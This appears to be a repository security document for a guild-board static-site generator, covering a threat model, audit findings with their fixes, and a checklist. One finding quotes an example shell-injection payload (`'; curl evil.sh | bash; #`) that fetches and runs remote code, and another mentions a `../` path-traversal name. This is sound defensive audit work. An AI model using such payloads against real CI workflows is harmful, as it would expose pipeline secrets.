# Security

Posture, findings, and the standing checklist for the guild board.
Living document — updated whenever a scan turns something up.

**Last full pass:** 2026-07-20, against `2.0` @ `61458a0`, on branch
`security-hardening`.

---

## Run the checks

```bash
python scripts/security_check.py           # everything (~1 min)
python scripts/security_check.py --quick   # skip the git-history sweep
python scripts/security_check.py --only actions
```

Four checks: dependency CVEs (pip-audit), static analysis (bandit),
committed credentials (working tree + every blob in history), and workflow
lint (script injection + least privilege). Exit code is the number of
failures. Scanners that aren't installed report `SKIP` rather than failing,
so the script still works on a bare checkout:

```bash
pip install -r requirements-dev.txt   # includes pip-audit + bandit
```

CI runs the identical script — `.github/workflows/security-scan.yml`, on
every push to `main`/`2.0`, every PR, and Mondays 08:00 UTC (a day ahead of
the Tuesday board run, so a bad dependency surfaces before the board
depends on it).

---

## Threat model

This is a static-site generator, not a server. There is no runtime, no
database, no login, and no user input at request time. That removes most of
the usual web attack surface. What's left:

| Surface | Trust | Why it matters |
|---|---|---|
| GitHub Actions | **highest value** | The board job holds WCL, Discord, and Pages tokens together in one step. |
| Workflow inputs (roast, names) | untrusted | Free text typed by officers, rendered onto a public page and into a shell. |
| Raider.io / WCL / Blizzard API data | untrusted | Third-party JSON: character names, spec strings, icon slugs. |
| Generated HTML on gh-pages | public output | Whatever escapes escaping is served to every guild member. |
| Committed caches (`roster_cache.json`, `board_state.json`) | public | Public WoW armory data by design. |

---

## Findings — 2026-07-20

### Fixed

**HIGH — Script injection in `weekly-board.yml`.** Six `workflow_dispatch`
inputs (`roast`, `roast_winner`, `roast_target`, `difficulty`, `lookback`,
`dry_run`) plus `github.ref_name` were interpolated as `${{ }}` directly
into `run:` bodies. `${{ }}` is substituted *before* the shell parses the
line, so a roast of `'; curl evil.sh | bash; #` executes as shell — in the
one step that holds `WCL_CLIENT_SECRET`, `DISCORD_WEBHOOK_URL`, and
`DISCORD_BOT_TOKEN`. `--difficulty` and `--lookback` were additionally
unquoted, so they word-split as well.
*Fix:* every input bound to an `env:` var and read as `"$VAR"`. 12 call
sites. Regression-tested in `tests/test_security_check.py`.

**MEDIUM — Pages token persisted to disk.** The publish step embedded
`WEB_BOARD_TOKEN` in the clone URL, which git writes into
`pages/.git/config` on the runner — readable by any later step or an
uploaded artifact.
*Fix:* token moved to an `http.extraheader` Authorization header; nothing
lands on disk.

**MEDIUM — Workflows without `permissions:`.** `board-vote.yml` and
`redesign-vote.yml` declared none, inheriting the repo default (read+write
on every scope for most repos).
*Fix:* both pinned to `contents: read`. They only render and post.

**MEDIUM — Dependency floors admitted vulnerable builds.** `Pillow>=10.0`
permits 10.3.0–12.1.0, the range affected by CVE-2026-25990 (PSD buffer
overflow). This is in the real path: the board downloads remote icon and
character-render images and decodes them with Pillow.
*Fix:* floors raised to first-patched — `Pillow>=12.2.0`,
`requests>=2.32.4`, `Jinja2>=3.1.5`, `PyYAML>=6.0.2`.

**LOW — `urlopen` accepted any scheme.** `--server` (ComfyUI) and
`DISCORD_WEBHOOK_URL` were concatenated into request URLs unvalidated;
`urlopen` honours `file://` and `ftp://`, so a mis-pasted secret could turn
an attachment POST into a local file read. *Fix:* schemes pinned to
http(s)/https at both entry points; the five `urlopen` sites now carry
justified `# nosec B310` annotations rather than the check being disabled
globally.

### Audited, no action needed

- **XSS on the web board — clean.** `Environment(autoescape=True)`
  (`html_board.py:545`), zero uses of `|safe`, zero `Markup()`, zero
  `from_string`. Player names reach `href` only through
  `{{ profile_base }}{{ row.name | lower | urlencode }}` against a
  hardcoded WCL base. Icon `src` values are built from a literal
  `https://wow.zamimg.com/...` template, so API data can't change the host.
  Jinja inside `<style>` blocks is all owner-authored theme config, not
  remote data.
- **Secrets — clean.** No credential material in the working tree (186
  files) or anywhere in history (479 blobs). Every secret reads from
  `os.environ`; `config.yml` mentions them only in comments.
- **YAML — clean.** All 7 load sites use `yaml.safe_load`. No
  `yaml.load`, no custom `Loader=`.
- **Static analysis — clean.** Bandit: 0 high, 0 medium after triage.
- **Dependency CVEs — clean.** pip-audit reports no known vulnerabilities.

### Not fixed here — needs the owner

1. **`blizzard.py` builds API paths without encoding.** `realm_slug` and
   `character_name` go straight into
   `/profile/wow/character/{realm_slug}/{name}`. Roster entries come from
   Raider.io, so a crafted name containing `../` could redirect the request
   to a different Game Data endpoint. Low severity (same host, read-only,
   token scoped to public profile data) but trivially fixed:

   ```python
   from urllib.parse import quote
   base_path = (f"/profile/wow/character/"
                f"{quote(realm_slug, safe='')}/{quote(name, safe='')}")
   ```

   Not applied because `guild_board/blizzard.py` is **uncommitted work in
   another session's tree** — editing it would collide.

2. **`blizzard-profile-refresh.yml` has the same injection pattern** as the
   weekly board did, via `${{ github.event.inputs.force }}`. Lower severity
   (declared `type: boolean`, so GitHub constrains it), but fix it the same
   way for consistency:

   ```yaml
   env:
     IN_FORCE: ${{ github.event.inputs.force }}
   run: |
     if [ "$IN_FORCE" == "true" ]; then args+=(--force); fi
   ```

   Also uncommitted in another tree.

3. **Enable GitHub-native protections** (repo Settings → Code security) —
   these can't be set from code:
   - Secret scanning **+ push protection** (blocks a credential at `git
     push`, which is the only control that stops a leak *before* it needs
     rotating)
   - Dependabot alerts + security updates (`.github/dependabot.yml` is in
     place and covers pip and github-actions)
   - Settings → Actions → Workflow permissions → **read-only default**

4. **Pin actions to commit SHAs?** Currently `actions/checkout@v5` and
   `actions/setup-python@v6` — tags, which are mutable. The March 2026
   trivy-action attack force-pushed 75 of 76 version tags and exfiltrated
   secrets from every pipeline that used it. These are first-party GitHub
   actions (much lower risk than third-party), and Dependabot updates SHA
   pins automatically, so the maintenance cost is small. **Owner decision:**
   worth doing, not urgent.

---

## Encryption — deliberately minimal

Assessed; most of it should **not** be encrypted:

| Data | Decision |
|---|---|
| `roster_cache.json`, `board_state.json` | **Plaintext.** Public armory data. Encrypting costs key management and breaks readable diffs on the weekly auto-commit, for no confidentiality gain. |
| `blizzard_profile_cache.json` | **Plaintext.** Character gender/race/class/spec and render URLs — all public on the armory. Revisit if it ever caches anything account-level (real names, emails, battletags), which it currently does not. |
| WCL / Discord / Blizzard / Pages secrets | **Already correct.** GitHub Secrets (encrypted at rest, masked in logs) → env vars → memory. Never written to disk, never in `config.yml`. |
| API traffic | **Already correct.** Every endpoint is `https://`; schemes now validated at both `urlopen` entry points. |
| Published board | **Public by design.** |

The one encryption-adjacent change made was moving `WEB_BOARD_TOKEN` out of
a URL and into a header, so it stops being written to the runner's disk.

---

## Checklist

Standing controls — CI enforces the checked items on every PR.

- [x] No secrets in the working tree or git history
- [x] Secrets read from env only, never from config or source
- [x] Jinja autoescape on; no `|safe`, no `Markup`, no `from_string`
- [x] Untrusted URLs never reach `href`/`src` without a hardcoded host
- [x] Workflow inputs bound to `env:`, never spliced into `run:`
- [x] Every workflow declares least-privilege `permissions:`
- [x] Tokens never embedded in URLs written to disk
- [x] `yaml.safe_load` everywhere
- [x] Dependency floors at first-patched versions
- [x] Weekly + per-PR automated scanning
- [x] Dependabot configured (pip + github-actions)
- [ ] GitHub secret scanning + push protection enabled *(owner, repo settings)*
- [ ] Repo default workflow permissions set to read-only *(owner, repo settings)*
- [ ] `blizzard.py` path encoding *(blocked: other session's uncommitted file)*
- [ ] `blizzard-profile-refresh.yml` input binding *(blocked: same)*
- [ ] Actions pinned to SHAs *(owner decision)*

---

## If a credential leaks

Rotate first, scrub second — order matters. History rewriting does not
un-leak a secret that was pushed; assume anything committed to a public repo
was scraped within minutes.

1. Revoke at the source: [WCL](https://www.warcraftlogs.com/api/clients/) ·
   [Battle.net](https://develop.battle.net/access/clients) · Discord
   (Server Settings → Integrations → Webhooks, or the bot's Developer Portal
   page) · GitHub PAT for `WEB_BOARD_TOKEN`.
2. Issue a new one; update the repo secret.
3. Then scrub history if you want it gone — but step 1 is what protects you.
